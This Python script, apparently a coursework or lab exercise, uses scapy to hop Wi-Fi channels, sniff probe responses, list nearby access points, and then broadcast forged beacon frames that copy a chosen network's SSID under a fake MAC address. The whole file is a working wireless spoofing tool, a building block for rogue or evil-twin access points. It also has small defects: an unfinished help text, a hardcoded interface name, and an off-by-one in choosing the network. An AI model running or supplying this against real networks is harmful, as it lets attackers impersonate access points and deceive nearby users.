# Source:
# - https://gist.github.com/securitytube/5291959
# - https://stackoverflow.com/questions/16748083/suppress-print-without-b-prefix-for-bytes-in-python-3
# - https://www.w3schools.com/python/python_dictionaries.asp
# - https://stackoverflow.com/questions/4256107/running-bash-commands-in-python
# - https://raspberrypi.stackexchange.com/questions/13099/packet-sniffing-with-channel-hopping-using-scapy
# - https://fr.wikibooks.org/wiki/Programmation_Python/Les_threads
# - https://stackoverflow.com/questions/2408560/python-nonblocking-console-input (Mickey Chan answer)
# - https://www.w3schools.com/python/python_arrays.asp
# - https://stackoverflow.com/questions/18018033/how-to-stop-a-looping-thread-in-python

import argparse
import subprocess
import threading
import time
import curses
import datetime
from scapy.all import *

stdscr = curses.initscr()
curses.noecho()
stdscr.nodelay(1)

apList = []
line = 1
kill = False

# Arguments
parser = argparse.ArgumentParser(description="This script is ")
parser.add_argument("-i", "--interface", required=True, help="the interface to use")
parser.add_argument("-n", "--number", default=1, type=int, help="the number of fake probe response to send")

arguments = parser.parse_args()

stdscr.addstr(line,0,"SSID          Channel")
line += 1

# This function is threaded, and is used to launch 'iwconfig' in order to change the channel of the card, each 1 second.
def channelChange():
    i = 1

    while(True):
        if(kill):
            break
        
        time.sleep(1)
        cmd = "sudo iwconfig wlan0mon channel " + str(i)
        process = subprocess.Popen(cmd.split())

        i = (i + 1) % 14

        if(i == 0):
            i = 1

# This function verifiy if the packet is a management frame (either a Probe Request/Response), and read all necessary information from the packet (SSID, channel, etc...)
def detectSSID(packet):
    global line
    c = stdscr.getch()

    if(c != -1):
        fakeProbe(chr(c))

    if(packet.type == 0 and packet.subtype == 5):
        apName = packet.info.decode()

        if(apName == ""):
            apName = "Hidden"

        found = False

        # Searching if the AP is already in the list
        for p in apList:
            if(p.info.decode() == packet.info.decode()):
                found = True
                break
        
        if(not found):
            apList.append(packet)
            stdscr.addstr(line,0,str(len(apList)) + ") " + apName + " - " + str(frequencyToChannel(packet.Channel)))
            line += 1

def fakeProbe(apNumber):
    currentPacket = apList[int(apNumber)]

    global line
    stdscr.addstr(line,0,currentPacket.info.decode())
    line += 1

    stdscr.addstr(line,0,"Sending fake probe response")
    line += 1

    # Killing the changing channel thread
    global kill
    kill = True

    # Changing channel to the one of the real AP
    #cmd = "sudo iwconfig wlan0mon channel " + str(frequencyToChannel(currentPacket.Channel))
    #process = subprocess.Popen(cmd.split())
    
    # Crafting and sending the probe response
    fakeProbe = RadioTap(Flags=True) / Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF",addr2="AA:AA:AA:AA:AA:AA", addr3="AA:AA:AA:AA:AA:AA") / Dot11Beacon() / Dot11Elt(info=currentPacket.info.decode())

    for i in range(0, arguments.number):
        sendp(fakeProbe, iface=arguments.interface)

# This function transform a frequency number, into it's corresponding channel number
def frequencyToChannel(frequencyNumber):
    return int((frequencyNumber - 2407) / 5)

channelThread = threading.Thread(target=channelChange)
channelThread.start()
conf.iface = "wlan0mon"

def main(stdscr):
    a = sniff(iface=arguments.interface, prn=detectSSID)

curses.wrapper(main)